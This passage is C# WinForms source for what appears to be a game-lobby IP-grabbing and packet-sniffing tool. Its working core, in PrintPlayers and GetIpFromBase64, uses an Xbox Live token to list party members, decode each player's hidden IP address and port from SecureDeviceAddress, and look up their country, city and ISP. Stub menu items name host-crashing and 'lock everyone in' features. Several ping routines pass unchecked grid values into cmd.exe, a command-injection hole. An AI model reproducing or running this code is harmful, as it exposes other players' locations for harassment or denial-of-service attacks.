	{
	}

	private void ApplyToken(string token)
	{
		xboxpartyoptions form = new xboxpartyoptions(token);
		form.StartPosition = FormStartPosition.Manual;
		form.Location = new Point(base.Location.X + (base.Width - form.Width) / 2, base.Location.Y + (base.Height - form.Height) / 2);
		form.ShowDialog(this);
		base.Enabled = true;
	}

	private void rectoken(string account)
	{
		rec form = new rec(guna2TextBox5.Text);
		form.StartPosition = FormStartPosition.Manual;
		form.Location = new Point(base.Location.X + (base.Width - form.Width) / 2, base.Location.Y + (base.Height - form.Height) / 2);
		form.ShowDialog(this);
		base.Enabled = true;
	}

	private void guna2ControlBox1_Click_4(object sender, EventArgs e)
	{
		SetDataGridStyles();
	}

	private void guna2ControlBox3_Click(object sender, EventArgs e)
	{
		Pcdecryption.RowTemplate.Height = 35;
		dataGridView1.RowTemplate.Height = 35;
		dataGridView1.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.None;
		dataGridView1.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
		dataGridView1.DataSource = null;
		dataGridView1.DataSource = list;
		dataGridView1.Columns["Flag"].HeaderText = "";
		dataGridView1.Columns["Flag"].Width = 20;
		dataGridView1.Columns["Flag"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Username"].HeaderText = "Label";
		dataGridView1.Columns["Username"].Width = 90;
		dataGridView1.Columns["Username"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Gamefilter"].HeaderText = "Filter Name";
		dataGridView1.Columns["Gamefilter"].Width = 110;
		dataGridView1.Columns["Gamefilter"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["IPAddress"].HeaderText = "IP Address";
		dataGridView1.Columns["IPAddress"].Width = 100;
		dataGridView1.Columns["IPAddress"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Port"].HeaderText = "Port";
		dataGridView1.Columns["Port"].Width = 50;
		dataGridView1.Columns["Port"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Country"].HeaderText = "Country";
		dataGridView1.Columns["Country"].Width = 90;
		dataGridView1.Columns["Country"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Region"].HeaderText = "Region";
		dataGridView1.Columns["Region"].Width = 80;
		dataGridView1.Columns["Region"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["City"].HeaderText = "City";
		dataGridView1.Columns["City"].Width = 80;
		dataGridView1.Columns["City"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["ISP"].HeaderText = "ISP";
		dataGridView1.Columns["ISP"].Width = 200;
		dataGridView1.Columns["ISP"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["OutPackets"].HeaderText = "▲";
		dataGridView1.Columns["OutPackets"].Width = 40;
		dataGridView1.Columns["OutPackets"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["InPackets"].HeaderText = "▼";
		dataGridView1.Columns["InPackets"].Width = 40;
		dataGridView1.Columns["InPackets"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["ProtectionIcon"].HeaderText = "";
		dataGridView1.Columns["ProtectionIcon"].Width = 20;
		dataGridView1.Columns["ProtectionIcon"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Protected"].Visible = false;
		dataGridView1.Columns["IsInbound"].HeaderText = "";
		dataGridView1.Columns["IsInbound"].Visible = false;
		dataGridView1.Columns["IsInbound"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Protected"].Visible = false;
		dataGridView1.AllowUserToAddRows = false;
	}

	private void label4_Click(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void toolStripMenuItem5_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(dataGridView1.SelectedRows[0].Cells["Column1"].Value.ToString());
		MessageBox.Show("Copied Gamertag!");
	}

	private void toolStripMenuItem6_Click(object sender, EventArgs e)
	{
	}

	private void becomeUnkickableToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void crashHostToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void toolStripMenuItem7_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(dataGridView1.SelectedRows[0].Cells["Column4"].Value.ToString());
		MessageBox.Show("Copied XUID!");
	}

	private void lockEveryoneInToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void invisibleInPartyToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void copyIPIfPresentToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void addUsernameToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedCells.Count > 0)
		{
			int rowIndex = dataGridView1.SelectedCells[0].RowIndex;
			if (rowIndex >= 0 && rowIndex < dataGridView1.Rows.Count)
			{
				foreach (DataGridViewCell cell in dataGridView1.Rows[rowIndex].Cells)
				{
					if (cell.ValueType == typeof(string))
					{
						cell.Value = "";
					}
					else if (cell.ValueType == typeof(Image))
					{
						cell.Value = null;
					}
					else
					{
						cell.Value = null;
					}
				}
				dataGridView1.Rows.RemoveAt(rowIndex);
				ShowNotification("Selected row cleared successfully");
			}
			else
			{
				ShowNotification("Selected row index is out of range.");
			}
		}
		else
		{
			ShowNotification("No cells are selected.");
		}
	}

	private void logInContextMenu2_Opening(object sender, CancelEventArgs e)
	{
	}

	private void PingIpAddressOrHostname(string ipAddressOrHostname)
	{
		try
		{
			ProcessStartInfo psi = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				RedirectStandardInput = true,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			Process process = new Process
			{
				StartInfo = psi
			};
			process.Start();
			using (StreamWriter sw = process.StandardInput)
			{
				if (sw.BaseStream.CanWrite)
				{
					sw.WriteLine("ping " + ipAddressOrHostname + " -n 4");
				}
			}
			string output = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			MessageBox.Show(output, "Ping Result");
			process.Close();
		}
		catch (Exception ex)
		{
			MessageBox.Show("An error occurred: " + ex.Message, "Error", MessageBoxButtons.OK);
		}
	}

	private void pingCellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		ShowNotification("Successfully Cleared");
		dataGridView1.Rows.Clear();
	}

	private void pingCellToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedCells.Count > 0)
		{
			DataGridViewCell selectedCell = dataGridView1.SelectedCells[5];
			if (selectedCell.Value != null && !string.IsNullOrWhiteSpace(selectedCell.Value.ToString()))
			{
				string hostName = selectedCell.Value.ToString();
				string PingCMD = "/K mode con lines=25 cols=60 & ping " + hostName + " -t";
				Process.Start("CMD.exe", PingCMD);
			}
			else
			{
				ShowNotification("Please select a valid host from the DataGridView.");
			}
		}
		else
		{
			ShowNotification("Please select a host from the DataGridView.");
		}
	}

	private void toolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView3.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = guna2DataGridView3.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string obj = selectedRow.Cells[2].Value.ToString();
				string cellValue2 = selectedRow.Cells[3].Value.ToString();
				Clipboard.SetText(obj + " " + cellValue2);
			}
			else
			{
				MessageBox.Show("The selected row does not have enough cells.");
			}
		}
	}

	private void toolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView3.SelectedCells.Count > 0)
		{
			int rowIndex = guna2DataGridView3.SelectedCells[0].RowIndex;
			if (rowIndex >= 0 && rowIndex < guna2DataGridView3.Rows.Count)
			{
				foreach (DataGridViewCell cell in guna2DataGridView3.Rows[rowIndex].Cells)
				{
					cell.Value = "";
				}
				guna2DataGridView3.Rows.RemoveAt(rowIndex);
				ShowNotification("Selected row cleared successfully");
			}
			else
			{
				ShowNotification("Selected row index is out of range.");
			}
		}
		else
		{
			ShowNotification("No cells are selected.");
		}
	}

	private void toolStripMenuItem10_Click(object sender, EventArgs e)
	{
		ShowNotification("Successfully Cleared");
		guna2DataGridView3.Rows.Clear();
		processedIPsUnfiltered.Clear();
		addedIPs.Clear();
	}

	private void guna2ControlBox2_Click(object sender, EventArgs e)
	{
		Environment.Exit(0);
	}

	private void panel2_Paint(object sender, PaintEventArgs e)
	{
	}

	private async Task<ICollection<PlayerData>> PrintPlayers(IEnumerable<Member> players)
	{
		List<PlayerData> plers = new List<PlayerData>();
		foreach (Member player in players)
		{
			ConnectionInfo ipport = GetIpFromBase64(player.Properties.System.SecureDeviceAddress);
			GeolocationResponse ipinfo = null;
			try
			{
				ipinfo = JsonConvert.DeserializeObject<GeolocationResponse>(await httpclient.GetStringAsync("https://json.geoiplookup.io/" + ipport.IP));
			}
			catch
			{
			}
			PlayerData playerInfo = new PlayerData
			{
				Ip = ipport.IP,
				Gamertag = player.Gamertag,
				Port = ipport.Port,
				Country = ipinfo.country_name,
				City = ipinfo.City,
				ISP = ipinfo.Isp
			};
			plers.Add(playerInfo);
			SNIFF.Classes.Auth.Models.Label newLabel = new SNIFF.Classes.Auth.Models.Label
			{
				Name = playerInfo.Gamertag,
				Value = playerInfo.Ip
			};
			//await Global.Authenticator.CreateLabelAsync(newLabel);
			Global.Labels.Add(newLabel);
			guna2DataGridView4.Rows.Add(playerInfo.Gamertag, playerInfo.Ip, playerInfo.Port, playerInfo.Country, playerInfo.City, playerInfo.ISP);
		}
		return plers;
	}

	public async Task XboxGamertagAI()
	{
		XboxAPI xbox = new XboxAPI(guna2TextBox2.Text);
		try
		{
			guna2DataGridView4.Rows.Clear();
			Sessions sessionInfo = await xbox.GetSessionInfo((await xbox.GetProfileAsync()).ProfileUsers.First().Id);
			if (sessionInfo.Results.Any())
			{
				await PrintPlayers((await xbox.GetGameLobbyAsync(sessionInfo.Results.First().Id)).Members.Values);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	private void guna2DataGridView4_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void toolStripMenuItem11_Click_1(object sender, EventArgs e)
	{
		if (guna2DataGridView4.SelectedCells.Count > 0)
		{
			Clipboard.SetText(guna2DataGridView4.SelectedCells[0].Value.ToString());
		}
	}

	private void toolStripMenuItem12_Click(object sender, EventArgs e)
	{
		int rowIndex = guna2DataGridView4.SelectedCells[0].RowIndex;
		foreach (DataGridViewCell cell in guna2DataGridView4.Rows[rowIndex].Cells)
		{
			cell.Value = null;
		}
	}

	private void toolStripMenuItem13_Click(object sender, EventArgs e)
	{
		guna2DataGridView4.Rows.Clear();
	}

	private void toolStripMenuItem15_Click(object sender, EventArgs e)
	{
	}

	private static ConnectionInfo GetIpFromBase64(string base64)
	{
		if (base64 == null)
		{
			return new ConnectionInfo
			{
				IP = "Error",
				Port = "Error"
			};
		}
		byte[] secureDeviceAddress = Convert.FromBase64String(base64);
		if (secureDeviceAddress[0] != 1 || secureDeviceAddress[1] != 0)
		{
			return new ConnectionInfo
			{
				IP = "Error",
				Port = "Error"
			};
		}
		JsList<byte> last4 = new JsList<byte> { 0, 0, 0, 0 };
		int arrayIndex = 0;
		byte[] array = secureDeviceAddress;
		foreach (byte t2 in array)
		{
			arrayIndex++;
			last4.Unshift();
			last4.Push(t2);
			if (last4.Count == 4 && last4[0] == 32 && last4[1] == 1 && last4[2] == 0 && last4[3] == 0)
			{
				break;
			}
		}
		if (last4[0] != 32 || last4[1] != 1 || last4[2] != 0 || last4[3] != 0)
		{
			return new ConnectionInfo
			{
				IP = "Error",
				Port = "Error"
			};
		}
		string ipv4 = "";
		int ipvp = 0;
		for (int x = 0; x < 4; x++)
		{
			ipv4 = ipv4 + "." + (255 - secureDeviceAddress[arrayIndex + 8 + x]);
		}
		for (int j = 0; j < 2; j++)
		{
			ipvp += (255 - secureDeviceAddress[arrayIndex + 7 - j]) * (1 + 255 * j);
		}
		ipv4 = ipv4.Remove(0, 1);
		return new ConnectionInfo
		{
			IP = ipv4,
			Port = ipvp.ToString()
		};
	}

	private void guna2GroupBox3_Click_1(object sender, EventArgs e)
	{
	}

	private void Mainform_FormClosed(object sender, FormClosedEventArgs e)
	{
		Environment.Exit(0);
	}

	private void UpdateTextBoxVisibility()
	{
		if (guna2TabControl1.SelectedTab == playstationTab)
		{
			guna2TextBox3.Visible = true;
			guna2TextBox4.Visible = true;
		}
		else if (guna2TabControl1.SelectedTab == PcTab)
		{
			guna2TextBox3.Visible = true;
			guna2TextBox4.Visible = true;
		}
		else
		{
			guna2TextBox3.Visible = false;
			guna2TextBox4.Visible = false;
		}
	}

	private void guna2TabControl1_SelectedIndexChanged(object sender, EventArgs e)
	{
		UpdateTextBoxVisibility();
	}

	private void toolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedCells.Count > 0)
		{
			Clipboard.SetText(guna2DataGridView5.SelectedCells[0].Value.ToString());
		}
	}

	private void toolStripMenuItem17_Click(object sender, EventArgs e)
	{
		ShowNotification("Successfully Cleared");
		guna2DataGridView5.Rows.Clear();
		processedIPs.Clear();
	}

	private void toolStripMenuItem18_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedCells.Count > 0)
		{
			string ipAddressOrHostname = guna2DataGridView5.SelectedCells[0].Value.ToString();
			PingIpAddressOrHostname(ipAddressOrHostname);
		}
	}

	private void toolStripMenuItem16_Click(object sender, EventArgs e)
	{
		int rowIndex = guna2DataGridView5.SelectedCells[0].RowIndex;
		foreach (DataGridViewCell cell in guna2DataGridView5.Rows[rowIndex].Cells)
		{
			cell.Value = null;
			ShowNotification("Selected row cleared successfully");
		}
	}

	private void logInContextMenu5_Opening(object sender, CancelEventArgs e)
	{
	}

	private void logInContextMenu1_Opening(object sender, CancelEventArgs e)
	{
	}

	private void logInContextMenu6_Opening(object sender, CancelEventArgs e)
	{
	}

	private void adaptersave()
	{
		SettingsModel settingsModel = SettingsManager.Load();
		settingsModel.Adapter = guna2ComboBox1.Text;
		settingsModel.Save();
	}

	private void guna2Button7_ClickAsync(object sender, EventArgs e)
	{
		adaptersave();
		SettingsModel settings = SettingsManager.Load();
		if (string.IsNullOrEmpty(guna2ComboBox1.Text))
		{
			ShowNotification("Adapter not set, please set your adapter");
			return;
		}
		if (running)
		{
			running = false;
			mainThread.Abort();
			XboxGamertagAI();
			StopSniffing();
			guna2ComboBox1.Enabled = true;
			label6.Text = "Status: Idle";
			SniffBTN.Text = "Start Sniffing";
			if (settings.ShowDiscordRPC)
			{
				Globals.SetRPC(showDiscordRPC: true);
				Globals.UpdateRichPresence("", "Status: Idle");
			}
			else
			{
				Globals.SetRPC(showDiscordRPC: false);
			}
			return;
		}
		mainThread = new Thread(Listen);
		mainThread.Start();
		SniffBTN.Text = "Stop Sniffing";
		StartSniffing();
		guna2ComboBox1.Enabled = false;
		label6.Text = "Status: Sniffing";
		running = true;
		BackgroundWorker backgroundWorker = new BackgroundWorker();
		backgroundWorker.DoWork += UpdateLocations;
		backgroundWorker.RunWorkerAsync();
		if (settings.ShowDiscordRPC)
		{
			Globals.SetRPC(showDiscordRPC: true);
			Globals.UpdateRichPresence("", "Status: Sniffing");
		}
		else
		{
			Globals.SetRPC(showDiscordRPC: false);
		}
	}

	private void toolStripMenuItem1_Click_1(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = guna2DataGridView5.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string obj = selectedRow.Cells[2].Value.ToString();
				string cellValue2 = selectedRow.Cells[3].Value.ToString();
				Clipboard.SetText(obj + " " + cellValue2);
			}
			else
			{
				MessageBox.Show("The selected row does not have enough cells.");
			}
		}
	}

	private void toolStripMenuItem2_Click_1(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedCells.Count > 0)
		{
			int rowIndex = guna2DataGridView5.SelectedCells[0].RowIndex;
			if (rowIndex >= 0 && rowIndex < guna2DataGridView5.Rows.Count)
			{
				foreach (DataGridViewCell cell in guna2DataGridView5.Rows[rowIndex].Cells)
				{
					cell.Value = "";
				}
				guna2DataGridView5.Rows.RemoveAt(rowIndex);
				ShowNotification("Selected row cleared successfully");
			}
			else
			{
				ShowNotification("Selected row index is out of range.");
			}
		}
		else
		{
			ShowNotification("No cells are selected.");
		}
	}

	private void toolStripMenuItem3_Click_1(object sender, EventArgs e)
	{
	}

	private void toolStripMenuItem4_Click_1(object sender, EventArgs e)
	{
		guna2DataGridView5.Rows.Clear();
		ShowNotification("Successfully Cleared");
		processedIPsUnfiltered.Clear();
		addedIPs.Clear();
		psnfilter.Clear();
		processedIPs.Clear();
	}

	private void UpdateTabControlVisibility()
	{
		SettingsModel settings = SettingsManager.Load();
		guna2TextBox2.Text = settings.Token;
		guna2TextBox3.Text = settings.Yourepsn;
		guna2TextBox5.Text = settings.Recroomtoken;
		filteredGamesTab.Visible = settings.FilteredGames;
		playstationTab.Visible = settings.Playstation;
		xboxTab.Visible = settings.Xbox;
		otherInfoTab.Visible = settings.XBLTool;
		xblToolTab.Visible = settings.Otherinfo;
	}

	private void tabPage4_Click(object sender, EventArgs e)
	{
	}

	private void dataGridView1_CellContentClick_2(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void packetAnalyzerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedCells.Count > 0)
		{
			string selectedIP = dataGridView1.SelectedCells[5].Value?.ToString() ?? string.Empty;
			if (dataGridView1.SelectedCells[6].Value?.ToString() == null)
			{
				_ = string.Empty;
			}
			if (!string.IsNullOrEmpty(selectedIP))
			{
				PacketAnalyzer packetAnalyzer = new PacketAnalyzer(_packets[selectedIP].ToList())
				{
					StartPosition = FormStartPosition.Manual
				};
				packetAnalyzer.Location = new Point(base.Location.X + (base.Width - packetAnalyzer.Width) / 2, base.Location.Y + (base.Height - packetAnalyzer.Height) / 2);
				packetAnalyzer.ShowDialog(this);
			}
			else
			{
				MessageBox.Show("The selected cell does not contain a valid IP address.");
			}
		}
		else
		{
			MessageBox.Show("Please select a cell with an IP address.");
		}
	}

	private void copyFullRowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = dataGridView1.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string cellValue1 = selectedRow.Cells[5].Value.ToString();
				string cellValue2 = selectedRow.Cells[6].Value.ToString();
				string cellValue3 = selectedRow.Cells[7].Value.ToString();
				string cellValue4 = selectedRow.Cells[8].Value.ToString();
				string cellValue5 = selectedRow.Cells[9].Value.ToString();
				string cellValue6 = selectedRow.Cells[10].Value.ToString();
				Clipboard.SetText(cellValue1 + " " + cellValue2 + " " + cellValue3 + " " + cellValue4 + " " + cellValue5 + " " + cellValue6);
			}
			else
			{
				ShowNotification("PThe selected row does not have enough cells.");
			}
		}
	}

	private void dataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
	}

	private void guna2Button5_Click_5(object sender, EventArgs e)
	{
		SettingsModel settingsModel = SettingsManager.Load();
		settingsModel.Recroomtoken = guna2TextBox5.Text;
		settingsModel.Save();
		rectoken(guna2TextBox5.Text);
	}

	private void guna2Button9_Click_2(object sender, EventArgs e)
	{
		guna2Panel5.Show();
		guna2GroupBox3.Text = "Rec Room Access Token Auth";
		guna2Panel4.Hide();
	}

	private void guna2Button8_Click_1(object sender, EventArgs e)
	{
		guna2Panel4.Show();
		guna2GroupBox3.Text = "XBL Token Login";
		guna2Panel5.Hide();
	}

	private void copyEntireRowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView3.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = guna2DataGridView3.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string cellValue1 = selectedRow.Cells[2].Value.ToString();
				string cellValue2 = selectedRow.Cells[3].Value.ToString();
				string cellValue3 = selectedRow.Cells[4].Value.ToString();
				string cellValue4 = selectedRow.Cells[5].Value.ToString();
				string cellValue5 = selectedRow.Cells[6].Value.ToString();
				string cellValue6 = selectedRow.Cells[7].Value.ToString();
				Clipboard.SetText(cellValue1 + " " + cellValue2 + " " + cellValue3 + " " + cellValue4 + " " + cellValue5 + " " + cellValue6);
			}
			else
			{
				Alert("The selected row does not have enough cells.", alert.enmType.Success);
			}
		}
	}

	private void pingCellToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView3.SelectedCells.Count > 0)
		{
			DataGridViewCell selectedCell = guna2DataGridView3.SelectedCells[2];
			if (selectedCell.Value != null && !string.IsNullOrWhiteSpace(selectedCell.Value.ToString()))
			{
				string hostName = selectedCell.Value.ToString();
				string PingCMD = "/K mode con lines=25 cols=60 & ping " + hostName + " -t";
				Process.Start("CMD.exe", PingCMD);
			}
			else
			{
				ShowNotification("Please select a valid host from the DataGridView.");
			}
		}
		else
		{
			ShowNotification("Please select a valid host from the DataGridView.");
		}
	}

	private void copyEntireRowToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = guna2DataGridView5.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string cellValue1 = selectedRow.Cells[2].Value.ToString();
				string cellValue2 = selectedRow.Cells[3].Value.ToString();
				string cellValue3 = selectedRow.Cells[4].Value.ToString();
				string cellValue4 = selectedRow.Cells[5].Value.ToString();
				string cellValue5 = selectedRow.Cells[6].Value.ToString();
				string cellValue6 = selectedRow.Cells[7].Value.ToString();
				Clipboard.SetText(cellValue1 + " " + cellValue2 + " " + cellValue3 + " " + cellValue4 + " " + cellValue5 + " " + cellValue6);
			}
			else
			{
				Alert("The selected row does not have enough cells.", alert.enmType.Success);
			}
		}
	}

	private void pingCellToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedCells.Count > 0)
		{
			DataGridViewCell selectedCell = guna2DataGridView5.SelectedCells[2];
			if (selectedCell.Value != null && !string.IsNullOrWhiteSpace(selectedCell.Value.ToString()))
			{
				string hostName = selectedCell.Value.ToString();
				string PingCMD = "/K mode con lines=25 cols=60 & ping " + hostName + " -t";
				Process.Start("CMD.exe", PingCMD);
			}
			else
			{
				ShowNotification("Please select a valid host from the DataGridView.");
			}
		}
		else
		{
			ShowNotification("Please select a host from the DataGridView.");
		}
	}

	private async void guna2TextBox4_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode != Keys.Return)
		{
			return;
		}
		e.SuppressKeyPress = true;
		SettingsModel settingsModel = SettingsManager.Load();
		settingsModel.Yourepsn = guna2TextBox3.Text;
		settingsModel.Save();
		string username = guna2TextBox4.Text;
		string pattern = "^[a-zA-Z0-9-_]{3,16}$";
		if (!Regex.IsMatch(username, pattern))
		{
			ShowNotification("Error Trying to Decrypt user");
			return;
		}
		DataGridView targetDataGridView;
		if (guna2TabControl1.SelectedTab == playstationTab)
		{
			targetDataGridView = guna2DataGridView5;
		}
		else
		{
			if (guna2TabControl1.SelectedTab != PcTab)
			{
				ShowNotification("No valid tab selected.");
				return;
			}
			targetDataGridView = Pcdecryption;
		}
		if (targetDataGridView.Rows.OfType<DataGridViewRow>().FirstOrDefault((DataGridViewRow row) => row.Cells[1].Value?.ToString() == username) == null)
		{
			DataGridViewRow emptyRow = targetDataGridView.Rows.OfType<DataGridViewRow>().FirstOrDefault((DataGridViewRow row) => string.IsNullOrEmpty(row.Cells[1].Value?.ToString()));
			if (emptyRow != null)
			{
				string ip = emptyRow.Cells[2].Value?.ToString();
				emptyRow.Cells[1].Value = username;
				emptyRow.Cells[2].Value = ip;
				//await Global.Authenticator.CreateLabelBlacklistAsync(guna2TextBox3.Text);
				
				//await Global.Authenticator.CreateLabelAsync(newLabel);
				
				ShowNotification(username + " IP is " + ip);
				guna2TextBox4.Text = "";
			}
			else
			{
				ShowNotification("No empty rows available.");
			}
		}
		else
		{
			ShowNotification("Username and IP already exist.");
		}
	}

	private async void guna2Button3_Click(object sender, EventArgs e)
	{
		try
		{
			await new XboxAPI(guna2TextBox2.Text).GetProfileAsync();
			SettingsModel settingsModel = SettingsManager.Load();
			settingsModel.Token = guna2TextBox2.Text;
			settingsModel.Save();
			ApplyToken(guna2TextBox2.Text.ToString());
		}
		catch (HttpRequestException val)
		{
			HttpRequestException ex = val;
			ShowNotification("Token Not Found: " + ((Exception)(object)ex).Message);
		}
		catch (Exception ex2)
		{
			ShowNotification("Token Not Found: " + ex2.Message);
		}
	}

	private void guna2TextBox4_TextChanged(object sender, EventArgs e)
	{
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		notification.Hide();
		timer2.Stop();
	}

	private void Mainform_LocationChanged(object sender, EventArgs e)
	{
		UpdateNotificationPosition();
	}

	private void Mainform_SizeChanged(object sender, EventArgs e)
	{
		UpdateNotificationPosition();
	}

	private bool IsPortInRange(IEnumerable<string> ports, int port)
	{
		foreach (string portRange in ports)
		{
			if (TryParsePortRange(portRange, out var lowerRange, out var upperRange) && upperRange > port && port > lowerRange)
			{
				return true;
			}
		}
		return false;
	}

	private bool TryParsePortRange(string portRange, out int lowerRange, out int upperRange)
	{
		lowerRange = (upperRange = 0);
		if (portRange.Contains("-"))
		{
			try
			{
				string[] ranges = portRange.Split('-');
				lowerRange = Convert.ToInt32(ranges[0]);
				upperRange = Convert.ToInt32(ranges[1]);
				return lowerRange <= upperRange;
			}
			catch (FormatException)
			{
			}
		}
		return false;
	}

	private bool IsPayloadMatching(IEnumerable<string> payloads, byte[] payload)
	{
		if (!payloads.Any())
		{
			return true;
		}
		foreach (string payloadMatch in payloads)
		{
			IEnumerable<byte> matchPayload = ConvertHexToBytes(payloadMatch);
			if (payload.Contains(matchPayload))
			{
				return true;
			}
		}
		return false;
	}

	private bool IsLengthValid(FilterOption option, int payloadLength)
	{
		if (payloadLength >= option.MinimumLength)
		{
			return payloadLength <= option.MaximumLength;
		}
		return false;
	}

	private void SetDataGridStyles()
	{
		Pcdecryption.RowTemplate.Height = 35;
		dataGridView1.RowTemplate.Height = 35;
		dataGridView1.DataSource = null;
		dataGridView1.DataSource = list;
		dataGridView1.DataSource = null;
		dataGridView1.DataSource = list;
		dataGridView1.Columns["Flag"].HeaderText = "";
		dataGridView1.Columns["Flag"].Width = 20;
		dataGridView1.Columns["Flag"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Username"].HeaderText = "Label";
		dataGridView1.Columns["Username"].Width = 90;
		dataGridView1.Columns["Username"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Gamefilter"].HeaderText = "Filter Name";
		dataGridView1.Columns["Gamefilter"].Width = 110;
		dataGridView1.Columns["Gamefilter"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["IPAddress"].HeaderText = "IP Address";
		dataGridView1.Columns["IPAddress"].Width = 100;
		dataGridView1.Columns["IPAddress"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Port"].HeaderText = "Port";
		dataGridView1.Columns["Port"].Width = 50;
		dataGridView1.Columns["Port"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Country"].HeaderText = "Country";
		dataGridView1.Columns["Country"].Width = 90;
		dataGridView1.Columns["Country"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Region"].HeaderText = "Region";
		dataGridView1.Columns["Region"].Width = 80;
		dataGridView1.Columns["Region"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["City"].HeaderText = "City";
		dataGridView1.Columns["City"].Width = 80;
		dataGridView1.Columns["City"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["ISP"].HeaderText = "ISP";
		dataGridView1.Columns["ISP"].Width = 200;
		dataGridView1.Columns["ISP"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["OutPackets"].HeaderText = "▲";
		dataGridView1.Columns["OutPackets"].Width = 40;
		dataGridView1.Columns["OutPackets"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["InPackets"].HeaderText = "▼";
		dataGridView1.Columns["InPackets"].Width = 40;
		dataGridView1.Columns["InPackets"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["ProtectionIcon"].HeaderText = "";
		dataGridView1.Columns["ProtectionIcon"].Width = 20;
		dataGridView1.Columns["ProtectionIcon"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Protected"].Visible = false;
		dataGridView1.Columns["IsInbound"].HeaderText = "";
		dataGridView1.Columns["IsInbound"].Visible = false;
		dataGridView1.Columns["IsInbound"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		dataGridView1.Columns["Protected"].Visible = false;
		guna2DataGridView3.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
		guna2DataGridView4.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
		guna2DataGridView5.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
		guna2DataGridView3.RowTemplate.Height = 35;
		guna2DataGridView4.RowTemplate.Height = 35;
		guna2DataGridView5.RowTemplate.Height = 35;
		Pcdecryption.RowTemplate.Height = 35;
